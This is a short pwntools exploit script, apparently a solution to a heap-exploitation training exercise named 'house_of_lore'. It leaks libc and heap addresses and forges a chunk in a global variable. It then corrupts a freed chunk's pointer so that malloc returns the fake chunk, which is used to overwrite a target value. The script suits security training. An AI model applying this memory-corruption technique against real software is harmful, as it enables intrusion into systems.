#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_lore', checksec=False)

#libc = ELF('../.glibc/glibc_2.25/libc.so.6', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+290

b *main+390
b *main+521

b *main+748
b *main+849

b *main+945
b *main+1064
"""

index = 0

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)

def handle():
    io.recvuntil(b'puts() @ ')
    puts = int(io.recvline(), 16)
    io.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    success("puts leak")
    info('puts @ ' + hex(puts))
    success("heap leak")
    info('heap @ ' + hex(heap))
    return puts, heap

def send_name(name):
    io.sendafter(b'Enter your username: ', name)
    io.recvuntil(b'> ')

def malloc(size):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b'> ')
    index += 1
    return index - 1
    

def free(index):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')

def edit(index, data):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')

def target():
    io.send(b'4')
    io.recvuntil(b'> ')

def quit():
    io.send(b'5')
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

io = start()
puts, heap = handle()

# target fd 
name = p64(0) + p64(0x401) + p64(elf.sym['user']) + p64(elf.sym['user'])
send_name(name)

chunk_A = malloc(0x3f8)
malloc(0x88)
chunk_B = malloc(0x3f8)
malloc(0x88)

free(chunk_A)
free(chunk_B)

malloc(0x408)

edit(chunk_A, p64(elf.sym['user']))

fake_chunk = malloc(0x3f8)

edit(fake_chunk, p64(0)*4 + b'Much win\x00')
target()
quit()

io.interactive()
